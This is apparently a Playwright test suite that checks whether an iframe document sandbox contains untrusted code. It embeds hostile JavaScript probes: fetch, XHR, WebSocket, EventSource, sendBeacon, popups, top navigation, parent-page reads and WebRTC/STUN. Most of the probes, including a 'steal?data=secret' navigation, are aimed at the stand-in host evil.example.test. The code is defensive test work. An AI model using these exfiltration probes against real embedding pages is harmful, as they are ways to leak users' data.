import { DOCUMENT_IFRAME_SANDBOX_ATTR, frameSourceList } from '@hushbox/shared/documents';
import { expect, expectConsoleErrors, test } from '../fixtures.js';
import { matrix } from '../../scripts/lib/playwright/browser-matrix.js';
import { cspDirectiveTokens, PYTHON_PAGE_PATH, sandboxCspFor } from '../../apps/sandbox/src/csp.js';
import { requireEnv } from '../helpers/env.js';
import { expectOkResponse } from '../helpers/ok-response.js';
import {
  collectDocumentConsole,
  DocumentSandboxHarness,
  sandboxOriginUrl,
} from '../helpers/sandbox-harness.js';
import type { Page } from '../fixtures.js';

/**
 * Runtime confirmation that untrusted document code cannot escape the sandbox
 * origin. Each case runs a hostile document inside the real renderer served
 * under its real Content-Security-Policy and proves the escape is contained.
 * These are the alarm on the containment wall: an edit that weakens the sandbox
 * CSP or the iframe attributes makes a case here go red. The alarm sounds after
 * review rather than during it: the end-to-end suite runs in the merge queue and
 * on pushes to the trunk, never on a pull request, and the pre-push gate runs no
 * end-to-end task — so until a change is queued, a weakening edit is caught only
 * by whoever runs this suite by hand.
 *
 * Every case asserts the containment OUTCOME — no request left the frame, the
 * top frame never moved, the embedding origin stayed unreadable, no peer
 * connection could be built — and never the engine's account of the refusal. A
 * console string, a violation report's `blockedURI` form, an error class name:
 * each of those is one engine's way of reporting a block, and a case keyed to
 * one tests that engine rather than the wall. The wall itself is what the
 * security model claims, it is engine-independent, and every engine runs this
 * corpus.
 *
 * An outcome is read only from a channel that reports identically on every
 * engine — the lines the document logs, captured in Node by
 * {@link collectDocumentConsole}; the bridge messages the renderer itself
 * emits; what Playwright observes of the page (requests and sockets leaving it
 * via {@link watchOffAllowlistEgress}, dialog events, the top frame's URL); a
 * served response read through the API request context. That rule, not any
 * count of channels, is the constraint: a case may reach for a further channel
 * only if its report does not vary by engine. An independent backstop rides
 * along on every case: the suite's network allowlist aborts and fails on any
 * request to a non-allowlisted host, so a real escape fails the test even if
 * its own assertion somehow passed.
 *
 * The parent page is a synthetic cross-origin embedder (see the harness), so
 * the corpus isolates pure containment from the chat flow. iOS WKWebView is out
 * of automated reach entirely; where that residual matters, the case says so.
 */

/** A host that is deliberately absent from both the sandbox CSP and the suite allowlist. */
const OFF_ALLOWLIST_HOST = 'evil.example.test';
const OFF_ALLOWLIST_HTTPS = `https://${OFF_ALLOWLIST_HOST}`;
const OFF_ALLOWLIST_WSS = `wss://${OFF_ALLOWLIST_HOST}/socket`;

/** The off-allowlist URL at `path`, JSON-encoded for embedding in document source. */
function offAllowlistTarget(path: string): string {
  return JSON.stringify(`${OFF_ALLOWLIST_HTTPS}/${path}`);
}

/** Matches every captured console line, including an empty one. */
const ANY_CONSOLE_LINE = /[\s\S]*/;

/**
 * Opt the harness page out of the console channel entirely.
 *
 * The enumerated pattern list this replaces was a single engine's refusal prose
 * — a Chromium artifact in the suppression direction, which on another engine
 * turns an unmatched refusal into a teardown failure about console text rather
 * than about containment. Nothing is lost by dropping it, and the two console
 * readers in this file do not overlap: the gate opted out of here fails a test
 * on console **errors**, which on this page are only the engines' refusal
 * prose, while {@link collectDocumentConsole} keeps `log` and drops everything
 * else. So the corpus asserts what the document wrote and never how the engine
 * described the block — the rule above, enforced by that split rather than by
 * a pattern list. A frame that failed to boot, to hand over its port or to run
 * its document still fails loudly, on the positive fence every case opens
 * with. The channel that would carry a real escape — the network — stays
 * strict for every case.
 */
function allowSecurityRefusalNoise(page: Page): void {
  expectConsoleErrors(page, [ANY_CONSOLE_LINE]);
}

/** The host of `url`, or `''` for a URL this comparison cannot parse. */
function hostOf(url: string): string {
  try {
    return new URL(url).host;
  } catch {
    return '';
  }
}

/**
 * Record every request the page gets as far as the network layer aimed at the
 * off-allowlist host, across both channels Playwright reports separately (HTTP
 * requests and WebSocket connections).
 *
 * This is the corpus's primary containment observation, and what makes it
 * engine-independent: a CSP that stopped blocking lets the request reach that
 * layer, where this route sees it and the suite's allowlist behind it aborts it
 * — so the escape is recorded here on every engine, while whether and how the
 * engine reported the refusal is never read. Absence only means something
 * behind a positive fence, so each case first asserts that the document ran its
 * attempts.
 *
 * It is a route rather than a `request` listener because the two layers do not
 * agree, and only one of them is the outcome. A request reaching the route
 * layer means the renderer issued it, so an engine enforcing the policy leaves
 * this silent and an engine that stopped enforcing records the escape here.
 * Chromium raises the `request` event for an XHR and an EventSource its own CSP
 * refused, so a listener reports a fully contained document as an escape on that
 * engine alone. `fallback()` hands each request on to the allowlist registered
 * before this, so the independent backstop still runs.
 *
 * Recording happens before `fallback()`, so the suite's allowlist aborting the
 * request cannot be the reason this layer stayed silent — silence means the
 * renderer never issued it. What it still does not say is why the renderer did
 * not: nothing here separates a policy that refused from a destination that
 * could never have answered. The case aiming at a reachable host the policy does
 * not name rules out the destination that could never have answered; what
 * refuses that target it does not establish, because a negative control that
 * loosened `connect-src` left that case green on chromium and on webkit.
 */
async function watchOffAllowlistEgress(page: Page): Promise<string[]> {
  const escaped: string[] = [];
  const record = (url: string): void => {
    if (hostOf(url) === OFF_ALLOWLIST_HOST) escaped.push(url);
  };
  await page.route('**/*', async (route) => {
    record(route.request().url());
    await route.fallback();
  });
  page.on('websocket', (socket) => {
    record(socket.url());
  });
  return escaped;
}

const SPEC_MATRIX = matrix({ engine: 'engine-matrix', formFactor: 'desktop' });

test.describe('document sandbox containment', SPEC_MATRIX, () => {
  test('no egress channel reaches an off-allowlist host', async ({ unauthenticatedPage }) => {
    allowSecurityRefusalNoise(unauthenticatedPage);
    const escaped = await watchOffAllowlistEgress(unauthenticatedPage);
    const output = collectDocumentConsole(unauthenticatedPage);
    const harness = await new DocumentSandboxHarness(unauthenticatedPage).open();

    // fetch, XMLHttpRequest, WebSocket, EventSource and sendBeacon each aim at
    // the off-allowlist host; connect-src, which names this origin and nothing
    // else on this page, must stop all five. Every channel announces itself
    // BEFORE it tries, so the attempt is provable, and logs a LEAK line only
    // from a success callback. The `refused` lines are diagnostics for reading
    // a failed run and nothing asserts them: which one an engine produces — a
    // rejected promise, an error event, a synchronous throw — is that engine's
    // reporting path. sendBeacon's return value is not read either, and its
    // call is the last statement in the script, so it logs once the call
    // returns: without that line an absent or throwing sendBeacon leaves the
    // channel unattempted and the case green.
    const code = [
      `console.log('TRY:fetch');fetch(${offAllowlistTarget('fetch')}).then(function(){console.log('LEAK:fetch')}).catch(function(e){console.log('refused fetch '+e.name)});`,
      `console.log('TRY:xhr');try{var x=new XMLHttpRequest();x.open('GET',${offAllowlistTarget('xhr')});x.onload=function(){console.log('LEAK:xhr')};x.onerror=function(){console.log('refused xhr')};x.send();}catch(e){console.log('refused xhr '+e.name)}`,
      `console.log('TRY:ws');try{var w=new WebSocket(${JSON.stringify(OFF_ALLOWLIST_WSS)});w.onopen=function(){console.log('LEAK:ws')};w.onerror=function(){console.log('refused ws')};}catch(e){console.log('refused ws '+e.name)}`,
      `console.log('TRY:es');try{var s=new EventSource(${offAllowlistTarget('sse')});s.onopen=function(){console.log('LEAK:es');s.close();};s.onerror=function(){console.log('refused es');s.close();};}catch(e){console.log('refused es '+e.name)}`,
      `console.log('TRY:beacon');navigator.sendBeacon(${offAllowlistTarget('beacon')},'x');console.log('RETURNED:beacon');`,
    ].join('\n');
    await harness.sendInit('js', code);

    // The fence: the document ran and every channel was attempted. Without it
    // the negative assertions below would pass on a frame that executed nothing.
    for (const channel of ['fetch', 'xhr', 'ws', 'es', 'beacon']) {
      await expect.poll(output.text).toContain(`TRY:${channel}`);
    }
    // And the beacon call itself returned, not merely the line before it.
    await expect.poll(output.text).toContain('RETURNED:beacon');
    // No channel reported success, and — the containment outcome itself — no
    // request of any kind reached the host. Both read last because the fences
    // above cost several round trips, so anything the document emitted or
    // issued has long since been captured by the time they run.
    expect(output.text()).not.toContain('LEAK:');
    expect(escaped).toEqual([]);
  });

  test('the policy admits this origin and refuses a reachable host it does not name', async ({
    unauthenticatedPage,
  }) => {
    allowSecurityRefusalNoise(unauthenticatedPage);
    const output = collectDocumentConsole(unauthenticatedPage);
    const harness = await new DocumentSandboxHarness(unauthenticatedPage).open();

    // The off-policy target is the app's own preview origin: a different port, so
    // an origin `connect-src` does not name, on a server that is provably up and
    // on the suite's allowlist. Aimed at an unreachable or non-allowlisted host
    // instead, the same outcome would also be produced by DNS or by the harness
    // aborting the request. Ruling those out is all the target buys. A
    // negative control loosened `connect-src` and re-ran this case on chromium
    // and webkit (Playwright's bundled builds, no other engine), and the case
    // stayed green on both, so on neither of those engines does a green
    // `OFFPOLICY:REFUSED` establish that the policy is what refuses this target.
    // On webkit the sandbox reached an off-allowlist host under the loosened
    // policy while this target was refused anyway, for a reason the control
    // could not identify; on chromium the loosening never admitted this target.
    const reachableOffPolicy = `http://localhost:${requireEnv('HB_PREVIEW_PORT')}/`;
    // The off-policy probe and the same-origin `no-cors` probe differ in nothing
    // but their target, which rules out fetch mode and API as the reason their
    // outcomes differ; it does not establish the policy as that reason. The
    // negative control that loosened `connect-src` ran this case on chromium and
    // webkit: on webkit the pair still separated with the policy open, and on
    // chromium the loosening never admitted the off-policy target, so on neither
    // engine is the split shown to be the policy's doing. What refuses this
    // target on webkit the control could not identify. A response with no CORS
    // headers still resolves opaquely, so the off-policy probe rejects only when
    // the request is refused rather than answered. The same-origin CORS read is
    // the positive half at full strength — bytes delivered into the frame, not
    // merely a request permitted. `location.origin` is the served origin here;
    // the frame's own origin is opaque.
    const code = [
      "console.log('TRY:probes');",
      'var own=location.origin;',
      "fetch(own+'/render.html').then(function(r){return r.text()}).then(function(t){console.log('SAMEORIGIN:READ '+(t.length>0))}).catch(function(e){console.log('SAMEORIGIN:REFUSED '+e.name)});",
      "fetch(own+'/render.html',{mode:'no-cors'}).then(function(){console.log('SAMEORIGIN:ISSUED')}).catch(function(e){console.log('SAMEORIGIN:BLOCKED '+e.name)});",
      `fetch(${JSON.stringify(reachableOffPolicy)},{mode:'no-cors'}).then(function(){console.log('OFFPOLICY:REACHED')}).catch(function(){console.log('OFFPOLICY:REFUSED')});`,
    ].join('\n');
    await harness.sendInit('js', code);

    // The fence: the document ran. Without it the negative assertion here would
    // hold on a frame that executed nothing.
    await expect.poll(output.text).toContain('TRY:probes');
    // The legitimate direction: the policy admitted this origin and the frame
    // read what came back.
    await expect.poll(output.text).toContain('SAMEORIGIN:READ true');
    await expect.poll(output.text).toContain('SAMEORIGIN:ISSUED');
    // The containment direction, in the same fetch mode as the same-origin probe
    // and against a host that would have answered.
    await expect.poll(output.text).toContain('OFFPOLICY:REFUSED');
    expect(output.text()).not.toContain('OFFPOLICY:REACHED');
  });

  test('the iframe attributes block popups, top-navigation, modals, and reaching the parent', async ({
    unauthenticatedPage,
  }) => {
    allowSecurityRefusalNoise(unauthenticatedPage);
    const escaped = await watchOffAllowlistEgress(unauthenticatedPage);
    const output = collectDocumentConsole(unauthenticatedPage);

    // A real modal would surface as a dialog event; an allow-scripts-only frame
    // suppresses window.alert entirely, so none must fire.
    let dialogFired = false;
    unauthenticatedPage.on('dialog', (d) => {
      dialogFired = true;
      void d.dismiss();
    });

    const harness = await new DocumentSandboxHarness(unauthenticatedPage).open();

    const code = [
      // Popup: no allow-popups. The outcome is that no auxiliary context
      // exists — never the engine's account of the refusal, which differs:
      // some return null and some throw, and an uncaught throw here would
      // kill the document on its first statement and take every probe below
      // it with it. Both refusals are read as the one blocked outcome; only a
      // returned window handle is a leak.
      `let popup;try{popup=window.open(${JSON.stringify(OFF_ALLOWLIST_HTTPS)},'_blank');}catch{popup=null;}console.log('POPUP:'+(popup===null?'BLOCKED':'LEAK'));`,
      // Top navigation: no allow-top-navigation. Whether the assignment throws
      // is the engine's own choice, so it is caught and left unasserted; the
      // outcome read below is that the top frame is still on the harness page.
      `console.log('TRY:topnav');try{window.top.location.href=${offAllowlistTarget('top')};}catch(e){console.log('refused topnav '+e.name)}`,
      // Reaching the embedding app: cross-origin, no allow-same-origin → each
      // read throws on every engine, and the throw is the containment property
      // (the class of error it throws with is not read).
      `try{void window.parent.document;console.log('PARENT_DOM:LEAK');}catch(e){console.log('PARENT_DOM:BLOCKED')}`,
      `try{void window.top.location.href;console.log('TOP_LOC:LEAK');}catch(e){console.log('TOP_LOC:BLOCKED')}`,
      `try{void window.parent.localStorage;console.log('PARENT_STORAGE:LEAK');}catch(e){console.log('PARENT_STORAGE:BLOCKED')}`,
      // Modal: no allow-modals → alert is ignored and returns synchronously.
      `alert('x');console.log('MODAL:RETURNED');`,
    ].join('\n');
    await harness.sendInit('js', code);

    await expect.poll(output.text).toContain('POPUP:BLOCKED');
    await expect.poll(output.text).toContain('PARENT_DOM:BLOCKED');
    await expect.poll(output.text).toContain('TOP_LOC:BLOCKED');
    await expect.poll(output.text).toContain('PARENT_STORAGE:BLOCKED');
    // The alert() returned (suppressed, not shown) and no dialog ever surfaced.
    await expect.poll(output.text).toContain('MODAL:RETURNED');
    expect(dialogFired).toBe(false);
    // Top navigation was attempted, and the top frame is still the embedder.
    await expect.poll(output.text).toContain('TRY:topnav');
    await expect(unauthenticatedPage).toHaveURL(harness.parentUrl());
    expect(escaped).toEqual([]);
  });

  // The child self-navigation exfil is governed by the embedder's frame-src.
  // Both delivery mechanisms must contain it: the web `_headers` (an HTTP
  // header) and the Capacitor bundle's `<meta http-equiv>` — the mobile path
  // where `_headers` never reaches.
  for (const delivery of ['header', 'meta'] as const) {
    test(`a document cannot self-navigate its frame off the sandbox origin (frame-src via ${delivery})`, async ({
      unauthenticatedPage,
    }) => {
      allowSecurityRefusalNoise(unauthenticatedPage);
      const escaped = await watchOffAllowlistEgress(unauthenticatedPage);
      const output = collectDocumentConsole(unauthenticatedPage);
      const harness = await new DocumentSandboxHarness(unauthenticatedPage).open({
        frameSourceDelivery: delivery,
      });

      await harness.sendInit(
        'js',
        `window.location.href=${offAllowlistTarget('steal?data=secret')};console.log('NAV:attempted');`
      );

      // The fence: the assignment ran and returned. It is logged after the
      // assignment on purpose — reaching the next statement is what proves the
      // attempt was made rather than refused synchronously — and the capture is
      // in Node, so a navigation that had succeeded could not retract the line
      // the way it would wipe a marker written into the frame's own DOM.
      await expect.poll(output.text).toContain('NAV:attempted');
      // The containment outcome: the frame's navigation never reached the
      // network on any channel, so the URL and the secret in its query string
      // went nowhere. What the engine then does to the frame is deliberately
      // not read — Chromium commits an error document in it, destroying the
      // document that ran the code, while an engine that left the original in
      // place would have contained the exfil exactly as well. Asserting the
      // frame survives would test the engine's choice, not the wall.
      expect(escaped).toEqual([]);
    });
  }

  test('a torn-down frame stops executing — no messages or network after teardown', async ({
    unauthenticatedPage,
  }) => {
    allowSecurityRefusalNoise(unauthenticatedPage);
    const output = collectDocumentConsole(unauthenticatedPage);
    const harness = await new DocumentSandboxHarness(unauthenticatedPage).open();

    // The document beacons on an interval; teardown (the app's Stop) removes the
    // frame element, which destroys its execution context. Nothing may run or
    // emit afterwards — no zombie timer, no surviving worker (there are none).
    await harness.sendInit(
      'js',
      "var n=0;setInterval(function(){console.log('BEACON '+(n++))},30);console.log('ARMED');"
    );

    await expect.poll(output.text).toContain('ARMED');
    // Confirm it is actively emitting before we kill it.
    await expect.poll(output.text).toContain('BEACON 2');

    await harness.teardownFrame();
    // Re-embedding a frame and awaiting its handshake is a page round trip many
    // multiples of the 30 ms interval, so by the time the count is read below,
    // everything the dead document ever logged has been delivered.
    await harness.recreateFrame();
    await harness.waitForReady(2);

    const countBeacons = (): number => output.count('BEACON ');
    const frozenCount = countBeacons();
    // What makes the equality below mean anything: the beacons captured before
    // the frame died are still here. An observation channel that lived inside
    // the frame — a marker in its DOM — would read zero at this point, and
    // every assertion after it would hold while proving nothing. Three is what
    // the `BEACON 2` fence above guarantees.
    expect(frozenCount).toBeGreaterThanOrEqual(3);

    // The window, and a live-channel fence in one: the fresh frame runs a
    // document whose line arrives on the same channel, so the frozen count that
    // follows is read from a channel just proven to still be delivering. A
    // surviving interval would have pushed many more beacons across it.
    await harness.sendInit('js', "console.log('POST_TEARDOWN:alive');", 'r2');
    await expect.poll(output.text).toContain('POST_TEARDOWN:alive');
    expect(countBeacons()).toBe(frozenCount);
  });

  test('the served sandbox CSP and headers are the policy derived for this origin', async ({
    request,
  }) => {
    const sandbox = sandboxOriginUrl();
    // The path is held in one place because the policy is chosen by path: the
    // derivation asserted below has to be the one for the page requested here,
    // and two spellings of it could drift into asking about a different page.
    const rendererPath = '/render.html';
    const response = await request.get(`${sandbox}${rendererPath}`);
    await expectOkResponse(response, 'sandbox renderer read');

    // The sandbox origin is credential-free — it must never issue a cookie. This
    // is the invariant the approved subdomain rests on: a subdomain (rather than a
    // wholly separate domain) is safe only because no credentialed request ever
    // reaches this origin, so a Set-Cookie here would create a cookie jar that
    // could bleed across the app/sandbox boundary and is also what makes the `*`
    // CORS above safe. A future cookie-setting endpoint on this origin must fail here.
    expect(response.headers()['set-cookie']).toBeUndefined();

    const servedCsp = response.headers()['content-security-policy'];
    const servedDnsControl = response.headers()['x-dns-prefetch-control'];
    if (servedCsp === undefined) throw new Error('the sandbox origin served no CSP header');

    // The policy is a derivation over the origin it is served under, so the
    // expected value is that derivation for the origin this request reached
    // and the path it asked for — never a fixed string, and never the
    // committed `_headers`, which derives production's origin and is therefore
    // correctly a different policy from this one; that file is proved against
    // the production derivation by `apps/sandbox/src/headers.test.ts`, which
    // also pins its per-entry-point split. The two ends are
    // independently sourced: the server names the origin its own environment
    // handed it, while the origin here is the one the web app points its
    // renderer iframe at, so a server naming an origin browsers do not reach
    // it at fails rather than agreeing with itself.
    expect(servedCsp).toBe(sandboxCspFor(rendererPath, sandbox, false));
    expect(servedDnsControl).toBe('off');

    // The load-bearing containment directives must be present, so a byte-equal
    // match cannot pass on a policy that quietly dropped one.
    // The floor: anything not enumerated is denied, so an unset fetch directive
    // blocks rather than inheriting a permissive fallback.
    expect(servedCsp).toContain("default-src 'none'");
    // The renderer installs no wheels, so its network reach is its own origin
    // and nothing else, spelled out rather than left to `'self'`;
    // `apps/sandbox/src/csp.ts` records the measurements behind that. The whole
    // source list, not a containment check — a directive naming a hostile host
    // alongside this one still contains it, so only an exact list rejects the
    // widening. The Python page's grant is asserted where that page is
    // requested.
    expect(cspDirectiveTokens(servedCsp, 'connect-src')).toEqual([sandbox]);
    expect(servedCsp).not.toContain('https://pypi.org');
    expect(servedCsp).not.toContain('https://files.pythonhosted.org');
    // A fresh realm is the only way to recover the deleted WebRTC constructors;
    // denying child frames, workers, and objects removes it. Kept `webrtc 'block'`
    // is harmless belt-and-braces for any engine that later honors it.
    expect(servedCsp).toContain("frame-src 'none'");
    expect(servedCsp).toContain("child-src 'none'");
    expect(servedCsp).toContain("worker-src 'none'");
    expect(servedCsp).toContain("object-src 'none'");
    expect(servedCsp).toContain("webrtc 'block'");
    // The ported dev/e2e and Android shell origins embed the sandbox — the
    // portless form matched only port 80 and blocked them.
    expect(servedCsp).toContain('frame-ancestors');
    expect(servedCsp).toContain('http://localhost:*');
    // Inline execution is required (the sandbox runs the document's own scripts)
    // and grants no new capability — containment is origin isolation plus the
    // network lockdown, never script-src.
    expect(servedCsp).toContain("script-src 'unsafe-inline'");
    // And `'self'` is in no directive at all; `form-action` denies every
    // submission target outright. `apps/sandbox/src/csp.test.ts` pins these on
    // the derivation; this pins them on what the origin actually served.
    expect(servedCsp).not.toContain("'self'");
    expect(cspDirectiveTokens(servedCsp, 'form-action')).toEqual(["'none'"]);
    // A base URL is denied outright rather than pointed at an origin.
    expect(cspDirectiveTokens(servedCsp, 'base-uri')).toEqual(["'none'"]);
    // No wildcard egress ever crept in.
    expect(servedCsp).not.toContain('connect-src *');
    expect(servedCsp).not.toContain('*.evil');

    // The iframe attribute the corpus embeds with — and every containment case
    // above proves the runtime effect of — is exactly allow-scripts. It is the
    // shared constant the app itself renders, so this literal is what pins the
    // value: widening the grant reddens here and in the app's own pin together.
    //
    // The value is coupled to the sandbox origin's `form-action` directive:
    // adding `allow-forms` would leave a body-carrying POST channel guarded by
    // that CSP directive rather than by the attribute. An editor who needs the
    // grant has to settle that channel first, and updating this constant's
    // pins is not that settlement.
    expect(DOCUMENT_IFRAME_SANDBOX_ATTR).toBe('allow-scripts');
  });

  test('only the Python runtime page is served the policy that reaches the wheel hosts', async ({
    request,
  }) => {
    // micropip installs pure-Python packages from PyPI at run time, so this one
    // page needs two hosts no other page does. Served blind, the grant would
    // reach the document renderer too — which is the widening the split closes,
    // and the reason the served policy has to be read here rather than inferred
    // from the renderer's.
    //
    // The origin here is the suite's own static server, so what this case pins
    // is that the origin the corpus runs against serves the derivation for
    // itself and for this path. Which policy the deployed origin attaches to
    // this path is additionally
    // decided by `[assets] html_handling` in `apps/sandbox/wrangler.toml`, which
    // no server in this suite reads; `apps/sandbox/src/assets-runtime.test.ts`
    // executes Cloudflare's assets runtime over that config and is the proof for
    // production.
    const sandbox = sandboxOriginUrl();
    // Redirects are refused rather than followed: the policy split is keyed by
    // path, so a policy read off some other path than the one requested is not
    // the policy this page runs under. Following one would read the wrong block
    // and pass. The path is the constant the split itself is keyed on, so the
    // page requested and the page the expectation derives cannot diverge.
    const response = await request.get(`${sandbox}${PYTHON_PAGE_PATH}`, { maxRedirects: 0 });
    expect(response.status()).toBe(200);
    expect(response.headers()['set-cookie']).toBeUndefined();

    const servedCsp = response.headers()['content-security-policy'];
    if (servedCsp === undefined) throw new Error('the sandbox origin served no CSP header');
    expect(servedCsp).toBe(sandboxCspFor(PYTHON_PAGE_PATH, sandbox, false));
    // The whole source list, not a prefix: a directive naming a hostile host
    // after the wheel hosts still starts with that prefix, and the byte-equality
    // pin against `sandboxCspFor` cannot catch it either, because a widened
    // derivation moves both of that pin's ends together. The served origin is
    // named in full for the reason `apps/sandbox/src/csp.ts` records; it is the
    // same host, not a widening.
    expect(cspDirectiveTokens(servedCsp, 'connect-src')).toEqual([
      'https://pypi.org',
      'https://files.pythonhosted.org',
      sandbox,
    ]);
    // Widening connect-src is the whole difference; nothing else may have moved.
    expect(servedCsp).toContain("default-src 'none'");
    expect(servedCsp).toContain("frame-src 'none'");
    expect(servedCsp).toContain("child-src 'none'");
    expect(servedCsp).toContain("worker-src 'none'");
    expect(servedCsp).toContain("object-src 'none'");
    expect(servedCsp).not.toContain('connect-src *');
  });

  test('the app origin ships a frame-src CSP allowing the sandbox origin and nothing else', async ({
    request,
  }) => {
    const previewUrl = `http://localhost:${requireEnv('HB_PREVIEW_PORT')}`;
    const sandbox = sandboxOriginUrl();
    const response = await request.get(previewUrl);
    await expectOkResponse(response, 'app origin index read');
    const indexHtml = await response.text();

    // The app carries frame-src in the served HTML (the `<meta http-equiv>` that
    // also reaches the Capacitor WebView, where `_headers` does not), and it
    // names the sandbox origin — the allowlist a child self-navigation is bound
    // to. Its absence is the mobile exfil hole.
    expect(indexHtml).toMatch(/http-equiv=["']Content-Security-Policy["']/i);
    // The whole source list, not a containment check: a policy naming a hostile
    // origin alongside the sandbox one still carries the sandbox origin, so only
    // an exact list rejects the widening. Read through the shared reader the
    // app's own pin uses, so the two cannot disagree about what the policy says.
    expect(frameSourceList(indexHtml)).toEqual(["'self'", sandbox]);
  });

  // WebRTC is an egress channel the CSP cannot govern: connect-src does not cover
  // RTCPeerConnection, and `webrtc 'block'` is a draft directive Chromium does not
  // enforce (a raw document reaches a public STUN server over UDP despite it). The
  // wall is the bootstrap deleting the WebRTC constructors from the frame global
  // before any document code runs, so the constructor is absent and any
  // construction throws. That throw is what closes the STUN/TURN exfil path: no
  // peer connection is ever built, so no ICE candidate is gathered and no UDP
  // leaves the frame. The deletion is JS-layer, engine-agnostic — it holds on iOS
  // WKWebView too (which ignores the CSP directive entirely); the on-device
  // WKWebView confirmation is a separate manual check, but the mechanism proven
  // here is the same one that runs there.
  test('WebRTC constructors are absent so peer connections cannot be built', async ({
    unauthenticatedPage,
  }) => {
    allowSecurityRefusalNoise(unauthenticatedPage);
    const output = collectDocumentConsole(unauthenticatedPage);
    const harness = await new DocumentSandboxHarness(unauthenticatedPage).open();

    // Attempt to build a peer connection aimed at a public STUN server. The
    // constructor global is deleted, so `new RTCPeerConnection(...)` throws before
    // any candidate can be gathered — no `onicecandidate` handler is ever wired,
    // no STUN request is sent.
    await harness.sendInit(
      'js',
      [
        "console.log('RTC:typeof '+(typeof RTCPeerConnection));",
        "try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});",
        "pc.onicecandidate=function(e){if(e.candidate){console.log('ICE '+e.candidate.type);}else{console.log('ICE done');}};",
        "pc.createDataChannel('x');",
        'pc.createOffer().then(function(o){return pc.setLocalDescription(o)});',
        "console.log('WEBRTC:LEAK');}catch(e){console.log('WEBRTC:BLOCKED');}",
      ].join('\n')
    );

    // The constructor is gone and construction threw — the exfil channel is
    // closed. These two are also this case's only positive fence: it watches no
    // egress (a peer connection leaves over UDP, which Playwright does not
    // report), so without them the three negative assertions below would hold
    // on a frame that never ran the probe.
    await expect.poll(output.text).toContain('RTC:typeof undefined');
    await expect.poll(output.text).toContain('WEBRTC:BLOCKED');
    // A peer connection was never built, so no ICE candidate of any kind is
    // gathered; a srflx/relay candidate would have proven STUN/TURN egress.
    expect(output.text()).not.toContain('WEBRTC:LEAK');
    expect(output.text()).not.toContain('ICE srflx');
    expect(output.text()).not.toContain('ICE relay');
  });
});
